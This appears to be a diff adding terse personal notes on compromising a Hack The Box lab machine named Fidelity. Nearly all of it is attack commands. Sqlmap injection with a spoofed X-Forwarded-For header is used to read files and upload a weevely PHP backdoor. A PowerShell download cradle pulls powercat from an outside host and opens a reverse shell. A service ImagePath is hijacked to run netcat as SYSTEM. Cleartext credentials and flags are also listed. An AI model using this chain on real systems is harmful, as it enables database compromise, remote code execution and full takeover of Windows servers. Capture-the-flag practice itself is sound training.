@@ -1,0 +1,59 @@
+<!-- To Do:
+- Import Products
+- Link to new payment system
+- Enable SSL (Certificates location \\192.168.4.28\myfiles)
+<!-- Header -->
+
+./sqlmap.py -u "http://10.10.10.167.htb/search_products.php" --headers "X-Forwarded-For: 192.168.4.28" --data "productName=*" check that is app is sql vulnerable
+
+Dumping databases are useless. 
+Check priviledges:
+sqlmap -u "http://10.10.10.167/search_products.php" --headers "X-Forwarded-For: 192.168.4.28" --data "productName=*"  --privileges 
+
+And we have file and execute if we are hector and just file if we are manager
+Check who we are: `sqlmap -u "http://10.10.10.167/search_products.php" --headers "X-Forwarded-For: 192.168.4.28" --data "productName=*" --current-user`
+
+Let's see if the default directory is inetpub\wwwroot
+sqlmap -u "http://10.10.10.167/search_products.php" --headers "X-Forwarded-For: 192.168.4.28" --data "productName=*" --file-read="C:\inetpub\wwwroot\index.php"
+
+And it is. 
+
+Let's write a quick backdoor and than upload the stuff.
+Upload it: sqlmap -u "http://10.10.10.167/search_products.php" --headers "X-Forwarded-For: 192.168.4.28" --data "productName=*" --file-write=weevely.php --file-dest="C:\inetpub\wwwroot\uploads\weevely.php"
+
+Firewall.
+Sqlmap shell: sqlmap -u "http://10.10.10.167/search_products.php" --headers "X-Forwarded-For: 192.168.4.28" --data "productName=*" --os-shell
+
+Got that:
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.47:8081/powercat.ps1');powercat -c 10.10.14.47 -p 8082 -e cmd"
+
+Sequence:
+-> $pass = cOnvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
+-> $cred = New-Object System.Management.Automation.PSCredential("Fidelity\hector",$pass)
+-> Invoke-Command -Computer Fidelity -ScriptBlock { IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.47:8081/powercat.ps1');powercat -c 10.10.14.47 -p 1337 -e cmd } -Credential $cred
+
+And we have shell as Hector.
+
+Do this:
+get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "Hector Users Path"
+
+And this
+reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nca.exe 10.10.14.47 1338 -e cmd" /f
+
+Than restart
+Stop-Service wuauserv 
+Start-Service wuauserv
+
+Rooted. 
+
+
+Creds:
+-> manger:l3tm3!n
+-> hector:l33th4x0rhector
+
+Flags:
+-> User: d8782dd01fb15b72c4b5ba77ef2d472b
+-> Root: 8f8613f5b4da391f36ef11def4cec1b1
+
+Shell backdoor:
+-> https://github.com/WhiteWinterWolf/wwwolf-php-webshell 
